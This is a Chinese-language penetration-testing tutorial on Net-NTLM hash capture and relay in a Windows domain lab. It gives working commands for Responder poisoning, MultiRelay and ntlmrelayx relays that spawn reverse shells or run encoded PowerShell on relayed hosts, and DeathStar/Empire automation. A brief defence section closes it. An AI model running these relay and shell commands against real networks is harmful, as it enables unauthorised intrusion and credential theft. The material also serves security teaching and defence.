
# 内网渗透-net-NTLM hash的攻击


                                阅读量   
                                **683179**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">2</a>
                                </b>
                                                                                                                                    ![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](./img/200649/t01db5d717014e8f01c.jpg)](./img/200649/t01db5d717014e8f01c.jpg)



## 0x01 前言

记得之前有个知识点还没有去写，虽然比较简单，但是很多文章对突出的重点写的不够详细，所以我搭个环境整理一下，具体一些认证原理、以及中继转发的过程，请查看我的上一篇文章。



## 0x02 中继原理

对于SMB协议，客户端在连接服务端时，默认先使用本机的用户名和密码hash尝试登录，所以可以模拟SMB服务器从而截获其它PC的net-ntlm hash。而作为中继的机器必须要有域管理员权限或本地管理员权限，且被中继的机器要关闭smb签名认证，否则怎么去做中继呢，比如本文案例用域控做中继。

除了中继smb协议，还可以中继LDAP，从域内内收集更多的信息，包括用户、他们的组成员、域计算机和域策略；中继IMAP，Exchange 服务器上的 IMAP 支持 NTLM 身份验证，若Exchange启用 NTLM 身份验证，可以登录用户的邮箱。这些可以用来进一步的扩大危害。



## 0x03 获取net-NTLM hash

中继即让客户端连接到攻击者模拟的SMB，其实最关键的是先拿到net-ntlm hash，若是域管的hash，就可以拿到域内的任意主机权限。NTLM 身份验证被封装在其他协议中，但是无论覆盖的协议是什么，消息都是相同的，比如SMB、HTTP(S)、LDAP、IMAP、SMTP、POP3 和 MSSQL，就是说NTLM 支持多种协议。HTTP 进行身份验证的客户端会在“ Authorization”标头中发送 NTLM 身份验证消息，因此除了中继SMB可以直接登录之外，若是中继MSSQL等，可以转发登录目标的MSSQL。

下面总结几个获取方法：

1.中间人攻击，比如内网做个DNS劫持，如果是全内网劫持，危害是比较大的。

2.WPAD，自动发现协议，利用DNS 查找一个名为 WPAD 的主机名，如果不能通过上面描述的 LLMNR。 Responder开启WPAD后，-F，当目标浏览网站时强制使用NTLM hash认证，而且主机重启时也能抓到NTLM hash。

加-F参数即可开启WPAD抓取 hash，此时用户浏览网站Net-NTLM hash就被获取。

python Responder.py -I eth0 -v -F

[![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01388a3a897912be40.png)

[![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018b28df3b23701fbb.png)

3.web漏洞，如XSS、文件包含等获取net-NTLM hash。

4.LLMNR，构造不存在的主机名，当主机名无法使用 DNS 解析的主机，则使用本地链路多播名称解析，即LLMNR<br>
滥用自动发现协议产生的流量，Windows 代理自动检测 (WPAD) 功能，自动尝试使用 NTLM 身份验证进行身份验证<br>
通过中间人攻击获得的流量，比如DNS劫持，重定向到受害者工作站受信任的位置



## 0x04 中继反弹shell

攻击机ip

[![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01398ba33924376742.png)

靶机ip

[![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01ea1d4e78c13876ee.png)

受害者ip-域内pc

[![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01ddc275ab752069b4.png)

1、攻击机执行 python Responder.py -I eth0 -r -d –w

[![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013123827038262472.png)

2、sudo python MultiRelay.py -t 192.168.191.189 -u ALL

可以导入列表，这里演示一个攻击目标192.168.191.189，利用Responder的MultiRelay模块获取shell，如果成功，直接反弹192.168.191.189的shell

[![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t013459b869e1e6c111.png)

3、靶机执行 net use 192.168.191.190test

用户名密码随意输入，因为就算密码错误了，会调用这台机子自带的hash尝试登录攻击机，被攻击机获取hash，进行中继转发。

[![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t018b9cb441bc38966a.png)

4、执行之后，发现MultiRelay已经反弹受害机的shell

[![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01bc066ea7c711ec07.png)

获取shell之后进一步利用，可以dump hash、或加载到meterpreter、 CS，执行一下powershell命令即可。



## 0x05 DeathStar体验

1、启动empire

sudo python empire —rest —username username —password 123456

2、启动Deathstar，ip为攻击机ip，为了接管agent

python3 DeathStar.py -lip 192.168.191.190 -t 100 -u username -p 123456

[![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01b27a42c77178c938.png)

3、empire生成powershell

Listeners，会发现已经有了一个DeathStar监听

launcher powershell DeathStar，生成powershell代码

[![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01229f13ea86d7cea3.png)

4、启动Responder

sudo python Responder.py -I eht0 -r -d –v

Deathstar会自动寻找域控制器，及活跃用户等目录进行中继转发。

5、这条命令是对中继成功的机器，自动执行powershell，获取agent，powershell脚本放在引号中。

sudo ntlmrelayx.py -t 192.168.191.189 -c ‘powershell -noP -sta -w 1 -enc [powershell code]’

[![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t016e3343b5e577c5cc.png)

ntlmrelayx.py支持-tf（例如target.txt），把目标导入利用中继批量转发攻击。

6、net use 192.168.191.190a

[![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0105f0722b70305ab8.png)

[![](./img/200649/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t016bf9f3d1a26e527f.png)

可以看到对每台PC进行了转发测试，若成功则反弹shell。

这个工具感觉没有想象中的强大，前面几分钟都在攻击我的kali攻击机，然后开始对域控进行中继，在整个网段探测存活，再对存活主机进行中继转发.

总结：

如果我们的msf在自己内网怎么办，目标内网肯定无法直接转发到我们的Responder，可以通过msf劫持445端口到自己本地，设置一个远程监听端口(auxiliary/scanner/smb/smb_login)，用来接收smb的数据，在设置一个meterpreter反向转发端口(portfwdadd)。

防御：

所有攻击都滥用了 NLTM 身份验证协议，因此唯一完整的解决方案是完全禁用 NTLM 并切换到 Kerberos。操作系统若不支持 Kerberos 身份验证，无法禁用，启用 SMB 签名，启用 LDAP 签名等来缓解。
